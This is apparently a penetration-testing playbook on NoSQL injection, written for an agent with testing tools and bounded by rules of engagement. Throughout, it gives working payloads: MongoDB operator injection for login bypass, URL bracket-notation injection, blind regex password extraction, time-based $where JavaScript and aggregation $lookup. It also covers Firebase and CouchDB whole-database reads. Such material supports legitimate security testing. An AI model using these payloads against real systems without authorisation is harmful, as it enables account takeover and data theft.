# NoSQL Injection Testing

## Scope and preconditions

Applies to applications using NoSQL databases: MongoDB, CouchDB, DynamoDB,
Firebase/Firestore, Redis, Cassandra, or any non-relational data store.
The most common vector is MongoDB operator injection via JSON request bodies
or URL parameters in Node.js/Express applications.

It does **not** cover: SQL injection (use `sqli`), GraphQL injection (use
`graphql`), or LDAP injection.

## Rules of engagement

- MUST use only test accounts and test data.
- NEVER attempt to drop or modify database collections/tables.
- MUST stop enumeration after confirming the vulnerability — do not extract
  entire databases.
- MUST record the injection payload and the evidence of data access.

## Workflow

- [ ] 1. Identify NoSQL-backed endpoints
- [ ] 2. Test operator injection via JSON
- [ ] 3. Test operator injection via URL parameters
- [ ] 4. Test authentication bypass
- [ ] 5. Test blind extraction via $regex
- [ ] 6. Test $where JavaScript injection
- [ ] 7. Test aggregation pipeline injection
- [ ] 8. Test database-specific attacks
- [ ] 9. Record findings

## Step 1: Identify NoSQL-backed endpoints

### Goal
Determine which endpoints use NoSQL databases.

### Indicators in HTTP traffic
Use `search_responses` to find:
- MongoDB ObjectId patterns in responses: 24-character hex strings (`[a-f0-9]{24}`)
- Node.js/Express indicators: `X-Powered-By: Express`, JSON APIs
- Firebase URLs: `firebaseio.com`, `firebasedatabase.app`
- CouchDB patterns: `/_all_docs`, `/_design/`, `/_view/`
- Error messages containing: `MongoError`, `CastError`, `BSONTypeError`,
  `ValidationError`, Mongoose errors
- JSON request bodies with query-like parameters

## Step 2: Operator injection via JSON

### Goal
Inject MongoDB query operators through JSON request bodies.

### Core technique
MongoDB query operators start with `$`. If user input is placed directly into
a MongoDB query without sanitization:

**Authentication bypass (most common)**:
```json
{"username": "admin", "password": {"$ne": ""}}
```
The `$ne` (not equal) operator makes the password check always pass —
`password is not equal to ""` is true for any non-empty password.

**Return all users**:
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
Both conditions are true for all documents with non-empty values.

**Greater-than bypass**:
```json
{"username": "admin", "password": {"$gt": ""}}
```
Any string is greater than empty string — always true.

**Regex operator**:
```json
{"username": "admin", "password": {"$regex": ".*"}}
```
Matches any password.

### Other useful operators
| Operator | Effect |
|---|---|
| `$gt` | Greater than — always true for `""` |
| `$ne` | Not equal — always true for `""` |
| `$regex` | Regular expression match |
| `$exists` | Field exists — `{"$exists": true}` |
| `$in` | Value in array — `{"$in": ["admin", "root"]}` |
| `$nin` | Not in array |
| `$or` | Logical OR — `{"$or": [{"admin": true}, {"role": "admin"}]}` |
| `$where` | JavaScript expression evaluation |
| `$elemMatch` | Array element matching |
| `$size` | Array size check |
| `$type` | BSON type check |

Use `send_request` to test each operator. Use `compare_responses` to diff the
normal response against the injected response.

## Step 3: Operator injection via URL parameters

### Goal
Inject operators through URL query string parameters.

### Technique
Express.js body parsers automatically convert bracket notation to objects:
```
POST /login
Content-Type: application/x-www-form-urlencoded

username=admin&password[$ne]=anything
```
Express converts `password[$ne]` to `{$ne: "anything"}`.

URL parameter equivalent:
```
GET /api/users?role[$ne]=user
```

This is the **most common NoSQL injection vector** in Node.js applications
because developers don't expect URL parameters to become objects.

### Nested operators via URL
```
?filter[$or][0][admin]=true&filter[$or][1][role]=admin
```
Creates: `{$or: [{admin: true}, {role: "admin"}]}`

## Step 4: Authentication bypass

### Goal
Log in as any user without knowing the password.

### Actions
1. Intercept the login request. Modify the password field:
   ```json
   {"username": "admin", "password": {"$gt": ""}}
   ```
2. If using form encoding:
   ```
   username=admin&password[$gt]=
   ```
3. Check if you receive a valid session/token for the admin account.

### Enumerate usernames
```json
{"username": {"$regex": "^a"}, "password": {"$gt": ""}}
```
If a user starting with 'a' exists, you get a successful login. Iterate
through characters to discover usernames.

## Step 5: Blind extraction via $regex

### Goal
Extract field values character by character when responses are boolean.

### Technique
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
{"username": "admin", "password": {"$regex": "^c"}}
...
```

When the response differs (200 vs 401, different body size), you found the
correct first character. Continue:
```json
{"username": "admin", "password": {"$regex": "^ca"}}
{"username": "admin", "password": {"$regex": "^cb"}}
```

Use `run_intruder_attack` with a character set payload for each position.
This is the NoSQL equivalent of blind SQLi boolean extraction.

### Optimize with character class
```json
{"password": {"$regex": "^[a-m]"}}
```
Binary search narrows each character to ~6 requests instead of 36.

## Step 6: $where JavaScript injection

### Goal
Execute server-side JavaScript through the $where operator.

### Technique
MongoDB's `$where` evaluates JavaScript expressions:
```json
{"$where": "this.username === 'admin' && this.password.length > 0"}
```

**Time-based blind injection**:
```json
{"$where": "this.username === 'admin' && (function(){var start=new Date();while(new Date()-start<5000){}; return true;})()"}
```
If the response takes 5 seconds, the condition is true.

**Data extraction via timing** (busy-wait, since `sleep()` is shell-only):
```json
{"$where": "this.password.charAt(0) === 'a' && (function(){var s=new Date();while(new Date()-s<5000);return true})()"}
```

Note: Modern MongoDB (4.4+) restricts `$where` by default. But older versions
and Mongoose pipelines may still allow it.

## Step 7: Aggregation pipeline injection

### Goal
Abuse MongoDB aggregation stages for cross-collection access.

### Technique
If user input reaches an aggregation pipeline:
- `$lookup`: join data from other collections
  ```json
  {"$lookup": {"from": "users", "localField": "_id", "foreignField": "_id", "as": "stolen"}}
  ```
- `$out` / `$merge`: write results to another collection
- `$unwind` + `$group`: restructure data to bypass field-level access controls

These attacks require the injection point to be within an aggregation pipeline
operation, which is less common than query injection but more powerful.

## Step 8: Database-specific attacks

### CouchDB
- View injection via `_design` documents
- `_all_docs` without authentication → full database dump
- `_changes` feed for real-time data exfiltration

### Firebase/Firestore
- Security rules misconfiguration: `.read: true` at root level
- Direct REST API access bypassing client SDK rules:
  ```
  GET https://PROJECT.firebaseio.com/.json
  ```
  If security rules allow, returns entire database.
- Check `/.settings/rules.json` for readable security rules

### DynamoDB
- Condition expression injection in `FilterExpression`, `KeyConditionExpression`
- `attribute_exists` / `attribute_not_exists` for boolean-based blind
- Scan with no filter returns all items (if accessible)

### Redis
- Command injection if user input reaches Redis commands
- `KEYS *`, `CONFIG GET *` for information disclosure
- `EVAL` for Lua script execution

## Step 9: Record the finding

Use `add_pentest_finding` with:
- The vulnerable endpoint and parameter
- The injection payload
- The response showing data access or bypass
- Database type identified
- Impact: authentication bypass, data exfiltration, admin access

## Known false positives

- Operator syntax rejected by input validation — the application may parse
  but not pass operators to the database. Confirm with response differences.
- `$ne` in URL parameters ignored because the application uses a whitelist
  of allowed parameters.
- MongoDB ObjectId-like strings that are actually UUIDs or other hex identifiers.
- Firebase returning empty results — may be security rules blocking, not a
  vulnerability (the app correctly restricts access).
- Error messages from Mongoose validation, not from the database query itself.

## Reminder

NoSQL injection is most common in **Node.js/Express applications** using
**MongoDB with Mongoose**. The `password[$ne]=` URL parameter pattern is the
#1 vector because Express auto-converts bracket notation to objects. Always test
both JSON body injection and URL parameter injection. The three highest-impact
findings: **authentication bypass** (login as admin without password),
**blind regex extraction** (extract any field value character by character), and
**Firebase security rules** (entire database exposed via REST).
